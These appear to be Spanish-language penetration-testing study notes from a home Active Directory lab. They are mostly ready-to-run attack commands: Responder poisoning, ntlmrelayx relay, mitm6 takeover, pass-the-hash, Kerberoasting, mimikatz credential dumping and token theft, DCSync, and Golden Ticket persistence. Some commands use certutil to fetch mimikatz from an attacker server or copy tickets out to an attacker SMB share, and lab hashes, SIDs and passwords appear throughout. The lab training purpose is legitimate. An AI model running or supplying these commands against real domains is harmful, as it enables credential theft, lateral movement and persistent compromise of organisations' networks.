# Attacking Active Directory: Initial Attack Vectors
## LLMNR Poisoning

- El protocolo LLMNR se utiliza para identificar host en una red local cuando el DNS falla.

`responder -I eth0 -wv`

![[Pasted image 20241225203032.png]]

Ahora cuando alguna computadora quiera acceder a un recurso que no existe, capturaremos el hash de autenticación

![[Pasted image 20241225203309.png]]

Ahora si revisamos el responder veremos que capturamos el hash NTLMv2 que se utiliza para la autenticacion

![[Pasted image 20241225203550.png]]

## Cracking Hashes NTLMv2

Luego de capturar algunos hashes, los copiamos y los guardamos en un archivo hashes.txt

Sabiendo que los hashes son `NTLM` podemos utilizar `hashcat` para identificar el código de los hashes que necesitamos de la siguiente manera

`hashcat --help | grep -i 'NTLM'`

![[Pasted image 20241225204752.png]]

ahora vemos que el código es `5600` entonces podemos tratar de romper el hash de la siguiente manera

`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt`

![[Pasted image 20241225205244.png]]

![[Pasted image 20241225205328.png]]

Vemos que el estado es `cracked` y visualizamos la contraseña del usuario, esto se debe a que el usuario utiliza una contraseña débil.

## SMB Relay

Para este ataque necesitamos que la firma SMB este deshabilitada o que no sea requerida.

![[Pasted image 20241225213907.png]]

Acá vemos que el equipo OBITO y NarutoUzumaki no tienen la firma lo que los hace vulnerables y tomaremos sus direcciones IP para almacenarlas en un archivo llamado `host.txt`.

Ahora lo que necesitamos para realizar el ataque de relay es realizar cambios en el archivo de configuración de responder que es `responder.conf` y debemos cambiar el estado de `HTTP` y `SMB` a `off`.

`nano /etc/responder/Responder.conf`

![[Pasted image 20241225214256.png]]

Ahora iniciaremos nuevamente el responder

`responder -I eth0 -wv`

![[Pasted image 20241225214654.png]]

Vemos que SMB y HTTP están `off`.

Ahora necesitamos utiliza `ntlmrealyx` para poder realizar la retransmisión de los hashes obtenidos sobre nuestra lista de host que no requieren la firma.

`impacket-ntlmrelayx -tf host.txt -smb2support`

![[Pasted image 20241225214838.png]]

Ahora al igual que en `LLMNR` necesitamos intentar acceder a un recurso no disponible para capturar el hash y hacer la retransmisión, para esto dependemos de que el hash que obtuvimos sea de un administrador local sobre los targest que se encuentran en nuestra lista `host.txt`.

![[Pasted image 20241225215313.png]]

Vemos que no es posible acceder al recurso, pero revisaremos nuestro `ntlmrelayx` para ver si obtuvimos suerte capturando un hash de administrador local sobre nuestras maquinas.

![[Pasted image 20241225215614.png]]

Vemos que fue exitoso y logramos obtener los hashes SAM de la PC lo cual podríamos utilizarlos para realizar la ejecución de comandos por medio de `pass the hash`.

Pero también podemos hacer mas cosas, por ejemplo si a nuestro comando lo agregamos `-i` esto nos dará un modo  interactivo con el host.

`impacket-ntlmrelayx -tf host.txt -smb2support -i`

![[Pasted image 20241225220859.png]]

Vemos que logramos una autenticación exitosa y un modo interactivo especificando la dirección a la que nos debemos conectar

Ahora podemos iniciar a interactuar por medio de netcat y la dirección

![[Pasted image 20241225221457.png]]

Ahora vemos las opciones que tenemos pero podemos indagar mas viendo los compartidos y utilizando uno para empezar a indagar

![[Pasted image 20241225221607.png]]

Otra cosa que podemos hacer es ejecutar comandos directamente desde la retransmisión con la bandera
`-c 'command'` 

`impacket-ntlmrelayx -tf host.txt -smb2support -c 'whoami'`

![[Pasted image 20241225221938.png]]
Vemos que el comando se ejecuto correctamente.

## Gaining Shell Acces

Al haber obtenido los hashes SAM podemos autenticarnos al equipo y realizar la ejecución de comandos por medio de la técnica `pass the hash` para esto tenemos varios métodos pero estos son algunos

`impacket-psexec Administrator@10.10.20.128 -hashes 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f'`

![[Pasted image 20241225233116.png]]

`impacket-smbexec administrator@10.10.20.128 -hashes 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f'`

![[Pasted image 20241225233246.png]]

## IPv6 DNS TakeOver via mitm6

Para esta ataque dependemos del protocolo `ldap` y `ldaps`. Entonces primero debemos establecer nuestro `ntlmrelayx` para que trabaje por IPv6 y especificamos que el target será nuestro DC por medio de ldaps

`impacket-ntlmrelayx -6 -t ldaps://10.10.20.129 -wh wpadfake.naruto.local -l lootme`

![[Pasted image 20241226000223.png]]

Acá vemos que con `-wh` establecemos el falso wpad y que con   `-l` establecemos un directorio de salida en donde nos guardara toda la información que obtengamos.

Ahora configuramos `mitm6` que es mucho mas fácil, el cual nos ayudara hacer el envenenamiento por IPv6.

`mitm6 -d NARUTO.local`

![[Pasted image 20241226000200.png]]

Ahora lo único que necesitamos es simular que alguien en la red esta iniciando su computadora y esta empiece a realizar las autenticaciones de red previas o que alguien este realizando un inicio de sesión en algún servicio, con suerte podemos capturar una credencial privilegiada y así autenticarnos al DC para obtener información privilegiada del AD y crear una computadora en el.

![[Pasted image 20241226000443.png]]

Si vemos nuestra terminal en donde ejecutamos `mitm6` vemos que ya tenemos interacción

![[Pasted image 20241226001141.png]]

Ahora si revisamos nuestra terminal en donde estamos ejecutando `ntlmrelayx`

![[Pasted image 20241226001323.png]]

Vemos que nos dice que la autenticación fue realizada con éxito y que la información del dominio fue guardada en `lootdir`

![[Pasted image 20241226001611.png]]

Ahora vemos que logramos extraer información del Dominio como los usuarios, grupos, computadoras, políticas, etc.

![[Pasted image 20241226001906.png]]

Con este volcado de información podemos empezar a ver mas vectores de ataque que podemos aplicar a usuarios específicos.

Bueno ahora suponiendo que el Administrador realiza un inicio de sesión y capturamos esa autenticación, esto nos puede llevar a realizar mas cosas como la creación de una computadora o un usuario dentro del domino

![[Pasted image 20241226010335.png]]

Vemos que logramos capturar el inicio de sesión de un administrador y este nos crea un usuario en el grupo de `Enterprise Admins` y nos da las credenciales del usuario, adicional nos dice que podríamos probar una técnica llamada `DCSync` con la herramienta `secretsdump` 

`impacket-secretsdump NARUTO.local/kpogjYtLVF:'6M/C:Ep^Wz0KH)s'@10.10.20.129`

![[Pasted image 20241226013704.png]]

Al utilizar `secretsdump` con las credenciales creadas, vemos que es posible hacer el dump de los NTDS los cuales pueden ser utilizados para `pass the hash`, por lo que validamos el hash del usuario `Administrator`

![[Pasted image 20241226013912.png]]
Y vemos que con exito logramos ejecutar comandos en el Controlador de Dominio.

## Passback Attack

Este es un link sobre como abusar de las conexiones por LDAP que poseen las impresoras dentro de una red corporativa

https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack

# Attacking Active Directory: Post-Compromise Enumeration

## Domain Enumeration with ldapdomaindump

Primero debemos crear un directorio en donde almacenaremos toda la información que obtendremos `mkdir NARUTO.local`, luego entramos al directorio y ejecutaremos `ldapdomaindump`

`ldapdomaindump ldaps://10.10.20.129 -u 'NARUTO.local\nuzumaki' -p 'Password2'`

![[Pasted image 20241226224209.png]]

Ahora si revisamos la carpeta veremos que tendremos información sobre el dominio

![[Pasted image 20241226224334.png]]

Toda esta información podría ser útil ya que contiene información acerca de las computadoras, usuarios, grupos, políticas, etc, del dominio  y algunas veces podríamos llegar a obtener información en las descripciones de los usuarios

![[Pasted image 20241226224927.png]]

Como en este caso vemos que un usuario menciona la contraseña que tiene, podríamos probar estas credenciales con el DC para verificar si son validas.

![[Pasted image 20241226225112.png]]

En este caso vemos que las credenciales son exitosas y tenemos la ejecución de comandos en el DC.
## Domain Enumeration with Bloodhound

Primero tenemos que iniciar `neo4j` para luego poder utilizar `bloodhound`

`neo4j console`

![[Pasted image 20241226230518.png]]

![[Pasted image 20241226230633.png]]

Luego nos dirigimos a la dirección para la interfaz remota en donde nos pedirá iniciar sesión, esto lo haremos con las credenciales por defecto que son `neo4j` para usuario y para contraseña, luego de esto nos pedirá cambiar la contraseña, entonces tendremos que setear una nueva y no debemos olvidarla.

Ahora lo que haremos es iniciar `bloodhound` esto nos abrirá una interfaz que nos pedirá iniciar sesión, entonces hacemos el login con las credenciales establecidas en `neo4j`

![[Pasted image 20241226231215.png]]

Luego de iniciar sesión correctamente podremos visualizar esto, por el momento esta en blanco porque no hemos cargado nada de data aun.

Entonces ahora obtendremos la información que necesitamos con `bloodhound`

`bloodhound-python -d NARUTO.local -u 'ouchiha' -p 'Password1' -ns 10.10.20.129 -c all`

![[Pasted image 20241226231804.png]]

![[Pasted image 20241226232228.png]]

Y vemos toda la información que obtenemos.

Ahora para cargar toda esta información a `bloodhound` tenemos que seleccionar el siguiente botón de `upload data`

![[Pasted image 20241226232454.png]]

Seleccionamos todos nuestros archivos y le damos en `open`

![[Pasted image 20241226232602.png]]

Luego veremos que los datos se empezaran a cargar, ya solo tenemos que esperar

![[Pasted image 20241226232630.png]]

Luego de que la data se cargo, cerramos la pequeña pestaña y nos dirigimos a esta parte

![[Pasted image 20241226232905.png]]

Y empezaremos a ver información 

![[Pasted image 20241226232954.png]]

También podemos visualizar información mas especifica que podría ayudarnos a entender como realizar los movimientos laterales

![[Pasted image 20241226233046.png]]

Acá vemos quienes son los `Domain Admins`

![[Pasted image 20241226233131.png]]

Por ejemplo acá podemos ver la ruta mas corta para hacernos `Domain Admin` por medio de un usuario `Kerberoasteable`

![[Pasted image 20241226233436.png]]
## Domain Enumeration with Plumhound

Para el uso de esta herramienta necesitamos estar ejecutando `neo4j`, si tenemos alguna información almacenada, con el siguiente comando al podemos limpiar pero antes la analizara

`python PlumHound.py --easy -p [Pass_from_neo4j]`

![[Pasted image 20241226234914.png]]

Vemos que pudo establecer conexión exitosa a `neo4j`.
Ahora volveremos a ejecutar la herramienta pero de una manera diferente

`python PlumHound.py -x tasks/default.tasks -p [Pass_from_neo4j]`

![[Pasted image 20241226235355.png]]

Vemos que se completo y que nos entrega un archivo `Reports//Reports.zip` 

![[Pasted image 20241226235708.png]]

Vemos que dentro de la carpeta obtenemos toda la información del dominio, entonces para poder empezar a visualizar la información podríamos abrir el archivo `index.html`

![[Pasted image 20241226235901.png]]

Y desde acá ya empezamos a visualizar mas información.
![[Pasted image 20241227000008.png]]

## Attacking Active Directory: Post-Compromise Attacks

## Pass Attacks

Suponiendo que logramos  obtener credenciales de dominio, ahora tendríamos que ver en que equipos podemos iniciar sesión con estas credenciales, ya sea como administrador o como usuario normal, esto lo podemos hacer con la ayuda de `netexec`

`netexec smb 10.10.20.0/24 -u 'ouchiha' -p 'Password1'`

![[Pasted image 20241227001917.png]]

Como logramos ver, tenemos como `Pwn3d!` a `OBITO` y `NARUTOUZUMAKI` lo que significa que tenemos acceso de administradores locales en estas maquinas, pero en el caso del host `MADARA-DC` vemos que el usuario es valido pero no tenemos acceso de administrador a el.

Esto se realizo por medio de contraseña, pero que pasaría si no tenemos una contraseña y lo único que tenemos es un `hash`, también podríamos hacer `pass the hash` pero esto solo funciona con los hashes `NTLMv1` por lo que teniendo uno de estos hashes podríamos autenticarnos como el administrador local de la maquina con herramientas como `NetExec`

`netexec smb 10.10.20.0/24 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth`

![[Pasted image 20241227003144.png]]

Vemos que ahora seguimos teniendo el `Pwn3d!` en los host `OBITO` y  `NARUTOUZUMAKI` pero ahora ya no tenemos una autenticación valida con `MADARA-DC` pero es porque en ese host no tenemos acceso de administrador. 

Ya teniendo acceso de administrador en una maquina, podríamos hacer el dump de la SAM lo cual nos traería mas hashes que podrían ser utilizados para `pass the hash` según nuestra conveniencia, esto lo podríamos realizar especificando la bandera `--sam`

`netexec smb 10.10.20.0/24 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth --sam`

![[Pasted image 20241227003635.png]]

Al igual que para extraer la sam, podemos visualizar las carpetas compartidas existentes con la flag `--shares`

`netexec smb 10.10.20.0/24 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth --shares`

![[Pasted image 20241227003912.png]]

De igual manera podemos hacer el dupm del LSA con la flag `--lsa`

`netexec smb 10.10.20.0/24 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth --lsa`

![[Pasted image 20241227004217.png]]

Otro truco que debemos saber es el uso de `-L`, esto nos ayudar a visualizar los módulos disponibles para cada servicio por ejemplo con SMB

`netexec smb -L`

![[Pasted image 20241227005044.png]]

Nos muestra los módulos disponibles y una pequeña descripción.

Si queremos utilizar un modulo, simplemente utilizamos la flag   `-M [modulo]` 

![[Pasted image 20241227005526.png]]
## Kerberoasting

Luego de conseguir credenciales validas en el dominio, podemos realizar el ataque de `kerberoasting` lo cual es obtener el hash de autenticación del servicio, esto lo podemos hacer con la herramienta `GetuserSPNs`

`impacket-GetUserSPNs NARUTO.local/ouchiha:Password1 -dc-ip 10.10.20.129 -request`

![[Pasted image 20241227225658.png]]

Ya con el hash obtenido, podemos tratar de romperlo, entonces lo copiamos y lo almacenamos en un archivo `kerberoasting-hash.txt`

`$krb5tgs$23$*SQLService$NARUTO.LOCAL$NARUTO.local/SQLService*$d6364f9372c9431086afd33a942ce9f8$aa9fc64bf09b27c5f40315feff59f09b07f5d16d35b137e0de70e0afafbeec1aedf10495aaa26aedec7e2a0e6d923c1e3cf50da0b5dae8db471cd3f17a11dc6540b45e43db212f7f68ccc0212288615d1558a5351baecc35cbc6568891f324224ba2c894159e8375a2bdfadcefab97810d60a05691851f4efbbc1d3d8c6d9cf07ef9f7f64cd342472f21e0e78921b6a62cceded5a0e97878e1aad37e69835351a13ef05348e33160ad24c02bd3f3676443129ce98b5e1f97873055c7410952f1ad1993a6834488343c151f2a73c4452059b0b9500cdc9a6b453db9bead1a23721b8d1f250fdae4b0665d7b65688b88a8e43232496b7b7eb3846624e384f65590fbf120332d1a10a04904f0b2c576c0088a1ba58b29d802754278c25a69b4baa9021d6f910fbd9df1999e5027e3eab07fdf6addfc7a2cf867f34eae49535cde929b7283641c80505cbf42e9071014496c9f478216e70477d29d589b40c9f389113522f05552126d4feed32d3263a9ae5a0d4ce11a64cc96f0aa2522d7bb27154651058122475d9588e9082534ffceb504ce7d631dbdd0121ab2ec6153fa7a0bbb77e2aa11043503092a209dc1ca38268a2c5fe605b05b177ccd743e88759811f3668900016a26991751b13d04c4c584749c8991a354171e2f6f95dcd53e473407268864e077a460fe14e8205cb6cff1e260a3dab0a7d70f43e29a5212f6d61008e138d8345d479d57b2f73a70f2472ea564c930c3797cd0837fa3fae85ab4db5005abc97b770f39bb5ecc74e138a8d6443d99623a0e22a94d9923d814d4d68647c399eb3fe8d2e0f9571deb274a850fd1ab6ff067a4c281d74c019093fe6036329912a61ac3e973b6972233eaef39ad5455f06e5b9637f367d0b51a7f4541990dc73838f398691753c882fae30cfef51167aaada38aec15e3c46c9f4f4d2b4b4b94fc4d22bb21096c83a654d48877bf7571b552d80237c09c8d5d4cfffdaa283d74b2ea1e9c62ebb605d699cb05ef49b2d7f430c4fa51ab9ac28c03d995b416a68db269d9b1ecd2e0f1fe30e716e7681e51a806fdc59880f887a71fd8b0cf8a1dad7f91b8392e566a9b7a2006cc50deed37d081268c9ea5d7fbea52bee90a124d25f841bf55b481a2f05361fbf88c0b19fd2de3b84bede930b6f4146ed58c5b2544db978bd29deaba974cd3593a4aa750cb8a6787d27a1e76e4ad9f1e1cf4f50cfaf0e226f9dc0eeaa3d6cb41a183438e07c6dd3ea384a089e9dbc7984d4d46071a8f5ac94a85789f7455ac26880256a4e9c92b573230b7ec1eb51cb1a4e9f23232ffa511a51c22278dc566b43e24f9c282fd4973add7b55f266e5cee76988ef4dfe1aad1146cca330b458afdf007b702743f9a2f4e44313743beef63c2f4d3a5cde74a76a83b95d783430af9ce01ecb3f1ed4ada88c52eb839267de2`

Con el siguiente comando de `hashcat` trataremos de romper el hash

`hashcat -m 13100 kerberoasting-hash.txt /usr/share/wordlists/rockyou.txt`

![[Pasted image 20241227231345.png]]

Vemos que fue posible romper el hash debido a que la contraseña es débil a pesar que cumple con una longitud mayor de 12 dígitos.
## Token Impersonation

Este tipo de ataque se basa en abusar del token de sesión de un usuario cuando inicia sesión en una maquina, esto lo podemos lograr utilizando `mimikatz` pero previo debemos tener acceso a la maquina y lo ideal es poder hacerlo como Administrador local.

Bueno primero nos pasamos `mimikatz` a nuestra maquina victima

Primero tenemos que levantar un servidor con Python para la transferencia del archivo `python3 -m http.server {port}`
luego solo nos aseguramos del nombre del archivo que queremos transferir

![[Pasted image 20241229000018.png]]

Luego solo realizamos la descarga de la manera que mas se nos haga amigable
`certutil -urlcache -split -f http://10.10.20.130:8080/gatomimi.exe C:\Windows\Temp\gatomimi.exe`

![[Pasted image 20241229000254.png]]

Ahora que tenemos `mimikatz` solo tenemos que ejecutarlo.

![[Pasted image 20241229000420.png]]

Ahora revisemos nuestro token con el comando `token::whoami`

![[Pasted image 20241229000532.png]]

Vemos que somos Administradores locales, pero revisemos que otros token de otros usuarios que han iniciado sesión en nuestra maquina podemos visualizar, esto lo podemos hacer con el comando `token::list`

![[Pasted image 20241229000728.png]]

Logramos visualizar otros tokens como el del usuario `ouchiha` pero en este caso no es necesario ya que ese usuario ya lo comprometimos, lo que buscamos es hacer una delegación de token de otro usuario o mejor aun, del administrador del dominio si hace un inicio de sesión en esta maquina.

Poniéndonos en el escenario en que el Administrador del Dominio hace un inicio de sesión en esta maquina, procederemos a revisar que tokens existen

![[Pasted image 20241229001133.png]]

Ahora ya logramos visualizar al administrador del dominio y su token, procedemos con la delegación con el siguiente comando `token::elevate /domainadmin`

![[Pasted image 20241229001254.png]]

Ahora vemos que tenemos el token del administrador del dominio y podemos hacernos pasar como el `Domain Admin`, pero ahora que mas podemos hacer? Pues ahora ya podemos extraer el hash NTLMv1 del Administrador del dominio con el siguiente comando `lsadump::dcsync /user:administrator`

![[Pasted image 20241229001510.png]]

Ahora que tenemos este hash, podemos hacer la técnica `pass the hash` 

![[Pasted image 20241229001737.png]]

Y vemos que logramos el `Domain Admin`, esta técnica de `token Impersonation `puede ser utilizada para el escalamiento de privilegios laterales o frontales. 

https://tools.thehacker.recipes/mimikatz/modules/token/elevate
## GPP / cPassword Attacks and Mitigations

https://infosecwriteups-com.translate.goog/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc&_x_tr_hist=true
## Credential Dumping with Mimikatz

Cuando vamos a iniciar a trabajar con `mimikatz` debemos establecer primero el modo de privilegios para depurar, podemos ver los privilegios con el siguiente comando `privilege::`

![[Pasted image 20241229012049.png]]

Ahora podemos observar todos los privilegios disponibles.

Por lo que ahora activamos el privilegio de depuración de la siguiente manera `privilege::debug`

![[Pasted image 20241229012351.png]]

Vemos que se activo de manera exitosa.

Ahora podríamos intentar enumerar todas las credenciales disponibles en el ordenador con el comando `sekurlsa::logonPasswords`

![[Pasted image 20241229013445.png]]

Acá veremos un gran `output` de las credenciales disponibles, podremos ver algunas credenciales en texto plano y también podremos ver el hash NTLMv1 que puede ser utilizado para `pass the hash`.
## Golden Ticket Attacks

En este caso suponiendo que ya ganamos acceso al Controlador de Domino, necesitaremos crear persistencia y lo podemos lograr con el ataque de `Golden Ticket`, para eso primero debemos descargar `mimikatz` al DC, para eso levantamos un servidor con python

![[Pasted image 20241229213427.png]]

Y luego hacemos la descarga con `cerutil`

`certutil -urlcache -split -f http://10.10.20.130:8080/gatomimi.exe C:\Windows\Temp\gatomimi.exe`

![[Pasted image 20241229213547.png]]

Luego de esto iniciamos `mimikatz` y nos otorgamos el privilegio de depurador

![[Pasted image 20241229213644.png]]

Ahora lo que necesitamos obtener es visualizar la información del usuario `krbtgt` para poder realizar un `golden ticket`.

`lsadump::lsa /inject /user:krbtgt`

![[Pasted image 20241229213908.png]]

Luego necesitamos anotar datos claves que nos ayudaran a obtener un `Golden Ticket`, como el `sid` del dominio y el hash `ntlm` del usuarios

![[Pasted image 20241229214222.png]]

`Domain : NARUTO / S-1-5-21-3223447166-19763989-743080822`

`NTLM : 0d3a0f74efbc83f79d5bb56703e5c439`

Con estos datos procedemos a crear un archivo `.kirbi`

`kerberos::golden /domain:NARUTO.local /sid:S-1-5-21-3223447166-19763989-743080822 /rc4:0d3a0f74efbc83f79d5bb56703e5c439 /user:Administrator /ticket:golden.kirbi`

![[Pasted image 20241229214901.png]]

Vemos que el ticket se guardo exitosamente, ahora pasemos el ticket a nuestro `Kali Linux` de la siguiente manera

Primero levantamos un servidor SMB de la siguiente manera

`impacket-smbserver smbFolder /home/engelberth/Documents/PNPT/smbShare -smb2support`

![[Pasted image 20241229231814.png]]

Luego copiamos el archivo `golden.kirbi` a nuestra carpeta compartida 

`copy golden.kirbi \\10.10.20.130\smbFolder\golden.kirbi`

![[Pasted image 20241230000330.png]]

Pero vemos que nos da un error por las políticas de seguridad, entonces probaremos de otra manera como por ejemplo la ejecución de comandos desde `netexec`

`netexec smb 10.10.20.129 -u 'Administrator' -p 'P@$$w0rd!' -x 'copy C:\Windows\Temp\test\golden.kirbi \\10.10.20.130\smbFolder'
`
![[Pasted image 20241230000728.png]]

Ahora vemos que nos dice que un archivo fue copiado, entonces si revisamos ahora nuestra carpeta en `kali linux`

![[Pasted image 20241230000911.png]]

Vemos que el DC se conecto a nuestra carpeta compartida y ya tenemos el archivo `golden.kirbi`. 

Por ejemplo ahora con el `golden ticket` que tenemos podemos tratar de listar recursos del Controlador de dominio desde la maquina de Naruto

`dir \\MADARA-DC\c$`

![[Pasted image 20241230003138.png]]

Pero vemos que tenemos un `Access is Denied`, pero ya con el Golden Ticket que es el archivo `golden.kirbi` podemos hacer un `pass the ticket` y así poder listar recursos.

Para eso primero cargamos `mimikatz` y el archivo `golden.kirbi` a la PC de Naruto.

![[Pasted image 20241230003608.png]]

Ya con los archivos en la PC de Naruto, ejecutamos `mimikatz` y establecemos permisos de depurador y luego le cargamos el archivo `golden.kirbi` con el comando

`kerberos::ptt golden.kirbi`

![[Pasted image 20241230003737.png]]

Vemos que nos carga el archivo, ahora si nos salimos de `mimikatz` y ejecutamos nuevamente `dir \\MADARA-DC\c$` que pasaria?

![[Pasted image 20241230003931.png]]

Vemos que fue posible listar las carpetas. Este `golden ticket` nos da acceso a todas las computadoras del dominio, pero también lo que necesitamos es la ejecución de comandos, el acceso a las computadoras, entonces esto lo podemos hacer de la siguiente manera que también nos ayudara a generar persistencia.

Ahora con la ayuda de la herramienta `ticketer` en base a nuestro archivo `.kirbi` podemos generar un archivo `.ccache` que nos ayudara a autenticarnos al DC sin necesidad de proporcionar contraseña.

Para crear el archivo necesitamos los datos previamente obtenidos del usuario `krbtgt` donde usaremos el `sid` del dominio y el hash `ntlm` del usuario.

`impacket-ticketer -nthash 0d3a0f74efbc83f79d5bb56703e5c439 -domain-sid S-1-5-21-3223447166-19763989-743080822 -domain NARUTO.local Administrator`

![[Pasted image 20241230004936.png]]

Vemos que el archivo `.ccache` se creo de manera exitosa.

Ahora lo que nos falta es establecer la siguiente variable de entorno

`export KRB5CCNAME='/Path/from/your/file.ccache'`

![[Pasted image 20241230005152.png]]

Ahora para autenticarnos con el DC con `PSExec` lo hacemos de la siguiente manera

`impacket-psexec NARUTO.local/administrator@MADARA-DC`

Y algo mas, es que no importa si le cambian la contraseña al usuario administrador, ya que podremos seguir accediendo con el archivo `.ccache`.

![[Pasted image 20241230160959.png]]

Los problemas con Kerberos normalmente son por la hora o por no escribir bien el nombre del domino.

![[Pasted image 20241230161159.png]]

Otro truco es agregar el dominio y el dominio con el nombre de la maquina al archivo de `host`.

Adicional siempre tenemos que establecer el mismo horario que el dominio, eso lo podemos hacer con el siguiente comando
`ntpdate -u NARUTO.local`.


Conexion PSSession

```Powershell
$creds = Get-Credential
```

```powershell
Enter-PSSession -ComputerName hq-srv01 -Credential $creds`
```

